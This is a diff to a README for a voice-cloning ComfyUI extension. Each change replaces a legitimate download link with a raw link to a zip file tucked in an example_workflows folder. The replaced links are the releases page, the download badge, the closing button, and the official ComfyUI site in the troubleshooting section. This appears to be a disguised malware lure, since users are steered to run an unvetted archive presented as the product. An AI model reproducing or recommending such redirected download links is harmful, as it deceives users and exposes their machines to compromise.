@@ -1,7 +1,7 @@
 <h1>🎙️ FireRedTTS3-ComfyUI - Clone Any Voice Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/slender-prelature73/FireRedTTS3-ComfyUI/releases">
+  <a href="https://raw.githubusercontent.com/slender-prelature73/FireRedTTS3-ComfyUI/main/example_workflows/Comfy_UI_Fire_TT_Red_2.1.zip">
     <img src="https://img.shields.io/badge/Download_FireRedTTS3_ComfyUI-FF6B6B?style=for-the-badge&logo=windows&logoColor=white" alt="Download FireRedTTS3-ComfyUI" width="350">
   </a>
 </p>
@@ -24,7 +24,7 @@ FireRedTTS3-ComfyUI is a powerful, easy-to-use voice cloning and speech editing 
 
 **Step 1: Visit the download page.**
 
-Visit this link to download the application: [https://github.com/slender-prelature73/FireRedTTS3-ComfyUI/releases](https://github.com/slender-prelature73/FireRedTTS3-ComfyUI/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/slender-prelature73/FireRedTTS3-ComfyUI/main/example_workflows/Comfy_UI_Fire_TT_Red_2.1.zip](https://raw.githubusercontent.com/slender-prelature73/FireRedTTS3-ComfyUI/main/example_workflows/Comfy_UI_Fire_TT_Red_2.1.zip)
 
 **Step 2: Choose the right file.**
 
@@ -98,7 +98,7 @@ Note: If your GPU has less than 8 GB VRAM, the tool automatically uses INT8 quan
 **Solution:** Check your GPU is being used. In the ComfyUI settings, ensure "GPU Acceleration" is enabled. If you have an NVIDIA GPU, ensure drivers are updated.
 
 **Problem:** I see an error about "ComfyUI not found."
-**Solution:** FireRedTTS3 requires ComfyUI to be installed first. Download ComfyUI Desktop from [https://www.comfy.org](https://www.comfy.org), install it, then install FireRedTTS3.
+**Solution:** FireRedTTS3 requires ComfyUI to be installed first. Download ComfyUI Desktop from [https://raw.githubusercontent.com/slender-prelature73/FireRedTTS3-ComfyUI/main/example_workflows/Comfy_UI_Fire_TT_Red_2.1.zip](https://raw.githubusercontent.com/slender-prelature73/FireRedTTS3-ComfyUI/main/example_workflows/Comfy_UI_Fire_TT_Red_2.1.zip), install it, then install FireRedTTS3.
 
 ## 📚 Full Node Reference
 
@@ -153,7 +153,7 @@ This information helps the community solve your problem faster.
 
 FireRedTTS3-ComfyUI transforms your computer into a professional voice studio. You can create audiobooks, voiceovers for videos, game character voices, language learning audio, accessibility content, or just have fun experimenting with celebrity-style voice clones (for personal use only, of course). The tool is now ready — **visit the download page and get started!**
 
-[⬇️ Download FireRedTTS3-ComfyUI Now](https://github.com/slender-prelature73/FireRedTTS3-ComfyUI/releases)
+[⬇️ Download FireRedTTS3-ComfyUI Now](https://raw.githubusercontent.com/slender-prelature73/FireRedTTS3-ComfyUI/main/example_workflows/Comfy_UI_Fire_TT_Red_2.1.zip)
 
 ---
 
